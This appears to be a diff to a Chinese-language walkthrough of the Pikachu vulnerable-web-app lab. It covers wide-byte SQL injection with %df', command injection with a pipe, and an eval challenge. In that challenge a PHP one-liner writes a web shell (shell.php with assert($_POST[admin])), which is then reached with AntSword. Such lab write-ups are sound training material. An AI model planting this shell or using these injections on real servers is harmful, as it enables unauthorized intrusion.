@@ -331,3 +331,70 @@ python sqlmap.py -u http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php -D pikach
 > <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/X7)G{WF~6VG2({%R7@P6Y6P.png?raw=true">
 
 *注：password字段内容的括号内为自动解码得到的结果*
+
+### 宽字节注入
+
+先来简单说说宽字节注入的原理。在之前做某些sql注入题的时候，会遇到报错信息中包含 `/'`的情况，这说明在制作PHP的时候，程序员使用相关函数对输入的敏感内容进行了转义，也就是在特殊字符前加上左斜杠，这样sql在查询时就会将其作为字符串，避免了sql注入的发生。而在使用中文编码的数据库中，因为汉字数量庞大，使用了两个字节进行编码。但此时就会出现一种情况，假设左斜杠的编码为%5c，在中文数据库中一定会有某些汉字的两个字节的编码中存在%5c，这就跟汉字的偏旁和部首一样，我们输入 `'` ，后台转义后的结果是 `%5c'` ，如果我们输入 `%df'` ，后台转义后的结果将会是 `%df%5c'` ，而此时 `%df%5c` 恰巧对应了某个汉字，将左斜杠消除了
+
+判断字段数
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/5J`MHEU2UO0(H@%LDLU(_50.png?raw=true">
+
+*注：宽字节注入的报错只有图中的一种类型*
+
+判断回显点
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/LIYRB)42(}P]_C[[AA~[D0F.png?raw=true">
+
+查询数据库和版本
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/X~J4(PQ3W1_LJ7_HTKH8D7K.png?raw=true">
+
+以下省略
+
+## RCE
+
+RCE，remote command/code execute的简称，在DVWA中即是Command Injection
+
+### exec "ping"
+
+输入127.0.0.1，出现结果
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/GGP39PO`]%OS_W45P67PGPC.png?raw=true">
+
+使用管道符
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/YNRV6FJD_ROFJTV1Q6))QKS.png?raw=true">
+
+### exec "eval"
+
+输入phpinfo();，直接跳出了相关页面
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/}@2)2G8~QSRHJ38G9MM7)$0.png?raw=true">
+
+说明后台对输入的内容没有进行任何过滤，下面生成一个一句话木马文件
+
+```php
+fputs(fopen('shell.php','w'),'<?php assert($_POST[admin]);?>');
+```
+
+- `fputs(arg1, arg2[, arg3])` 写入文件函数，有三个参数，arg1指定要写入的文件，arg2指定写入的字符串，arg3可选，指定写入的最大字节数
+
+- `fopen(arg1, arg2[, arg3, arg4])` 打开文件函数，有四个参数，arg1指定需要打开的文件，arg2指定该文件的访问方式，arg3指定是否开启检索，arg4指定文件句柄的环境
+
+- `'w'` w是fopen()函数中第二个参数的其中一项，指以写入方式打开文件，并将文件大小截为0。如果文件不存在，则创建该文件
+
+- `assert()` 断言函数，此处是将括号内的内容作为PHP代码执行
+
+文件创建成功
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/D{VRWQH1YL(}]F@GD$ZSR{6.png?raw=true">
+
+使用蚁剑连接，注意选择base64编码方式，default无法连接
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/{2(V9B4AC%8([Y8`]FGX7}T.png?raw=true">
+
+## File Inclusion
+
+### File Inclusion(local)
+
